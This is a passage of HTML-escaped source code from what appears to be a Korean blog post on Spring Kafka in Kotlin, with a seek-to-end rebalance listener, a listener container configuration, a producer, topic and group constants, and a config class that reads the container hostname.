class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;TopicPartition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
      &lt;span class=&quot;c1&quot;&gt;// 파티션 할당 시, 해당 파티션의 오프셋을 끝으로 이동  &lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;partitions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;forEach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;partition&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&amp;gt;&lt;/span&gt;  
          &lt;span class=&quot;n&quot;&gt;consumer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;seekToEnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;listOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;partition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;  
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;kafkamessagelistenerconfig&quot;&gt;KafkaMessageListenerConfig&lt;/h2&gt;
&lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.global.config&lt;/span&gt;  
        
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.apache.kafka.clients.consumer.ConsumerConfig&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.apache.kafka.common.serialization.StringDeserializer&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.beans.factory.annotation.Value&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.context.annotation.Configuration&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.core.DefaultKafkaConsumerFactory&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.listener.ContainerProperties&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.listener.KafkaMessageListenerContainer&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.listener.MessageListener&lt;/span&gt;  
        
&lt;span class=&quot;nd&quot;&gt;@Configuration&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;KafkaMessageListenerConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;seekToEndRebalanceListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SeekToEndRebalanceListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
        
  &lt;span class=&quot;nd&quot;&gt;@Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;\${spring.kafka.bootstrap-servers}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;lateinit&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;bootstrapServers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;  
        
  &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;createKafkaMessageListenerContainer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
      &lt;span class=&quot;n&quot;&gt;topic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
      &lt;span class=&quot;n&quot;&gt;groupId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
      &lt;span class=&quot;n&quot;&gt;messageListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;MessageListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;  
  &lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;KafkaMessageListenerContainer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
      &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;consumerProps&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mapOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Any&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;(&lt;/span&gt;  
          &lt;span class=&quot;nc&quot;&gt;ConsumerConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;BOOTSTRAP_SERVERS_CONFIG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bootstrapServers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
          &lt;span class=&quot;nc&quot;&gt;ConsumerConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;KEY_DESERIALIZER_CLASS_CONFIG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
          &lt;span class=&quot;nc&quot;&gt;ConsumerConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;VALUE_DESERIALIZER_CLASS_CONFIG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
          &lt;span class=&quot;nc&quot;&gt;ConsumerConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;GROUP_ID_CONFIG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;groupId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
          &lt;span class=&quot;nc&quot;&gt;ConsumerConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;AUTO_OFFSET_RESET_CONFIG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;latest&quot;&lt;/span&gt;  
      &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
        
      &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;consumerFactory&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DefaultKafkaConsumerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;consumerProps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
        
      &lt;span class=&quot;c1&quot;&gt;// 구독할 토픽을 동적으로 지정  &lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;containerProperties&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ContainerProperties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;topic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
        
      &lt;span class=&quot;c1&quot;&gt;// 메시지를 수동으로 처리할 Listener  &lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;containerProperties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;messageListener&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;messageListener&lt;/span&gt;  
        
      &lt;span class=&quot;c1&quot;&gt;// 컨슈머 리밸런싱이 일어날 때, 항상 최신 오프셋에서 읽기 시작  &lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;containerProperties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;setConsumerRebalanceListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seekToEndRebalanceListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
        
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;KafkaMessageListenerContainer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;consumerFactory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;containerProperties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
        
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;프로듀서&quot;&gt;프로듀서&lt;/h2&gt;
&lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.kafka.producer&lt;/span&gt;  
        
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.constant.KafkaTopic&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.kafka.core.KafkaTemplate&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.stereotype.Service&lt;/span&gt;  
        
        
&lt;span class=&quot;nd&quot;&gt;@Service&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UserProducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;kafkaTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;KafkaTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
        
  &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
      &lt;span class=&quot;n&quot;&gt;kafkaTemplate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;KafkaTopic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
        
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;상수-토픽&quot;&gt;상수 토픽&lt;/h2&gt;
&lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.constant&lt;/span&gt;  
        
&lt;span class=&quot;kd&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;KafkaTopic&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;user&quot;&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;상수-컨슈머-그룹-id&quot;&gt;상수 컨슈머 그룹 ID&lt;/h2&gt;
&lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.constant&lt;/span&gt;  
        
&lt;span class=&quot;kd&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;KafkaConsumerGroupId&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;user&quot;&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;appconfig&quot;&gt;AppConfig&lt;/h2&gt;
&lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.global.config&lt;/span&gt;  
        
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;jakarta.annotation.PostConstruct&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.context.annotation.Configuration&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.BufferedReader&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.InputStreamReader&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.util.UUID&lt;/span&gt;  
        
&lt;span class=&quot;nd&quot;&gt;@Configuration&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;AppConfig&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;containerId&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UUID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;randomUUID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;  
        
  &lt;span class=&quot;nd&quot;&gt;@PostConstruct&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initContainerId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
      &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
          &lt;span class=&quot;c1&quot;&gt;// 'hostname' 명령어 실행을 위한 ProcessBuilder 사용  &lt;/span&gt;
          &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;processBuilder&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ProcessBuilder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hostname&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
          &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;processBuilder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;  
          &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BufferedReader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;InputStreamReader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;  
          &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;containerIdString&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;readLine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// hostname 명령어의 결과  &lt;/span&gt;
        
          &lt;span class=&quot;c1&quot;&gt;// hostname 값이 비어 있지 않으면 containerId 업데이트  &lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;containerIdString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;isNullOrBlank&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
              &lt;span class=&quot;n&quot;&gt;containerId&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;containerIdString&lt;/span&gt;  
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
          &lt;span class=&quot;c1&quot;&gt;// 예외 발생 시 아무 일도 일어나지 않음  &lt;/span&gt;
          &lt;span class=&quot;nf&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Failed to retrieve container ID. Using default value.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
          &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;  
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
        
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;컨슈머&quot;&gt;컨슈머&lt;/h2&gt;
&lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.kafka.consumer&lt;/span&gt;  
        
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.constant.KafkaConsumerGroupId&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.constant.KafkaTopic&lt;/span&gt;  
